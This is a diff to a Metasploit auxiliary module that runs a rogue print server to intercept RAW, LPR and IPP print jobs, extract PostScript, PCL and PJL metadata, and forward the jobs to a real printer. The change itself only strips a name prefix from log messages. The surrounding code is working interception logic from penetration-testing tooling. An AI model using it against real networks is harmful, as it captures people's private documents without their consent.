@@ -71,7 +71,7 @@ class Metasploit3 < Msf::Auxiliary
             @srvhost = datastore['SRVHOST']
             @srvport = datastore['SRVPORT'] || 9100
             @mode = datastore['MODE'].upcase || 'RAW'
-            print_status("#{name}: Starting Print Server on %s:%s - %s mode" \
+            print_status("Starting Print Server on %s:%s - %s mode" \
                 % [@srvhost, @srvport, @mode])
 
             if datastore['FORWARD']
@@ -79,13 +79,13 @@ class Metasploit3 < Msf::Auxiliary
                 @rport = datastore['RPORT'] || 9100
                 if not datastore['RHOST'].nil?
                     @rhost = datastore['RHOST']
-                    print_status("#{name}: Forwarding all printjobs to #{@rhost}:#{@rport}")
+                    print_status("Forwarding all printjobs to #{@rhost}:#{@rport}")
                 else
-                    raise ArgumentError, "#{name}: Cannot forward without a valid RHOST"
+                    raise ArgumentError, "Cannot forward without a valid RHOST"
                 end
             end
             if not @mode == 'RAW' and not @forward
-                raise ArgumentError, "#{name}: Cannot intercept LPR/IPP without a forwarding target"
+                raise ArgumentError, "Cannot intercept LPR/IPP without a forwarding target"
             end
             @metadata = datastore['METADATA']
 
@@ -126,7 +126,7 @@ class Metasploit3 < Msf::Auxiliary
 
         if (Rex::Text.to_hex(curr_data.first)) == '\x02' and \
             (Rex::Text.to_hex(curr_data.last)) == '\x0a'
-            print_status("#{name}: LPR Jobcmd \"%s\" received" % curr_data[1..-2])
+            print_status("LPR Jobcmd \"%s\" received" % curr_data[1..-2])
         end
 
         return if not @state[c][:data]
@@ -147,7 +147,7 @@ class Metasploit3 < Msf::Auxiliary
             # postscript data
             if @state[c][:data] =~ /%!PS-Adobe/i
                 @state[c][:prn_type] = "PS"
-                print_good("#{name}: Printjob intercepted - type PostScript")
+                print_good("Printjob intercepted - type PostScript")
                 # extract PostScript data including header and EOF marker
                 @state[c][:raw_data] = @state[c][:data].scan(/%!PS-Adobe.*%%EOF/im).first
             end
@@ -155,7 +155,7 @@ class Metasploit3 < Msf::Auxiliary
             # pcl data (capture PCL or PJL start code)
             if @state[c][:data].unpack("H*")[0] =~ /[1b45|1b25|1b26]/
                 @state[c][:prn_type] = "PCL"
-                print_good("#{name}: Printjob intercepted - type PCL")
+                print_good("Printjob intercepted - type PCL")
                 #extract everything between PCL start and end markers (various)
                 @state[c][:raw_data] = \
                     Array(@state[c][:data].unpack("H*")[0]
@@ -173,7 +173,7 @@ class Metasploit3 < Msf::Auxiliary
                 @state[c][:data] =~ /application\/ipp/i
 
             if not @state[c][:prn_type]
-                print_error("#{name}: Unable to detect printjob type, dumping complete output")
+                print_error("Unable to detect printjob type, dumping complete output")
                 @state[c][:prn_type] = "Unknown Type"
                 @state[c][:raw_data] = @state[c][:data]
             end
@@ -184,7 +184,7 @@ class Metasploit3 < Msf::Auxiliary
                     print_status("#{out}")
                 end
             else
-                print_status("#{name}: No metadata gathered from printjob")
+                print_status("No metadata gathered from printjob")
             end
 
             # set name to unknown if not discovered via Metadata
@@ -205,7 +205,7 @@ class Metasploit3 < Msf::Auxiliary
         # extract PJL Metadata
 
         @state[c][:prn_metadata] = @state[c][:data].scan(/^@PJL\s(JOB=|SET\s|COMMENT\s)(.*)$/i)
-        print_good("#{name}: Extracting PJL Metadata")
+        print_good("Extracting PJL Metadata")
         @state[c][:prn_metadata].each do | meta |
             if meta[0] =~ /^COMMENT/i
                 @state[c][:meta_output] << meta[0].to_s + meta[1].to_s
@@ -225,7 +225,7 @@ class Metasploit3 < Msf::Auxiliary
         # extract Postsript Metadata
 
         @state[c][:prn_metadata] = @state[c][:data].scan(/^%%(.*)$/i)
-        print_good("#{name}: Extracting PostScript Metadata")
+        print_good("Extracting PostScript Metadata")
         @state[c][:prn_metadata].each do | meta |
             if meta[0] =~ /^Title|^Creat(or|ionDate)|^For|^Target|^Language/i
                 @state[c][:meta_output] << meta[0].to_s
@@ -240,7 +240,7 @@ class Metasploit3 < Msf::Auxiliary
         # extract IPP Metadata
 
         @state[c][:prn_metadata] = @state[c][:data]
-        print_good("#{name}: Extracting IPP Metadata")
+        print_good("Extracting IPP Metadata")
         case @state[c][:prn_metadata]
         when /User-Agent:/i
             @state[c][:meta_output] << @state[c][:prn_metdata].scan(/^User-Agent:.*&/i)
@@ -254,14 +254,14 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     def forward_data(data_to_send)
-        print_status("#{name}: Forwarding PrintJob on to #{@rhost}:#{@rport}")
+        print_status("Forwarding PrintJob on to #{@rhost}:#{@rport}")
         connect
         sock.put(data_to_send)
         sock.close
     end
 
     def stream_data(data_to_send)
-        vprint_status("#{name}: Streaming %d bytes of data to #{@rhost}:#{@rport}" \
+        vprint_status("Streaming %d bytes of data to #{@rhost}:#{@rport}" \
             % data_to_send.length)
         connect if not sock
         sock.put(data_to_send)
